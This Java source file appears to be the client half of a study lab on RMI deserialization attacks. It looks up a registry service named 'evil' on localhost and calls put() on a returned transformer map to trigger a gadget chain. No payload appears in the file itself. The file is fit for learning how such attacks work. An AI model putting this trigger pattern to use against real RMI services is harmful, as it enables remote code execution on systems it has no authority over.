package barcelona.littlet1gger.rmi.attackClient;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Map;

/**
 *
 */
public class RMIClient {
    public static void main(String[] args) throws Exception {
        // Connect to RMI server :localhost:1099
        Registry registry = LocateRegistry.getRegistry("localhost", 1099);
        // search service which called evil and cast type to EvilService
        EvilService evilService = (EvilService) registry.lookup("evil");

        //call evil method: and need to call "put" function to trigger
        Map evilObject = (Map)evilService.evilTransformerMap();
        evilObject.put("1","111");
    }
}
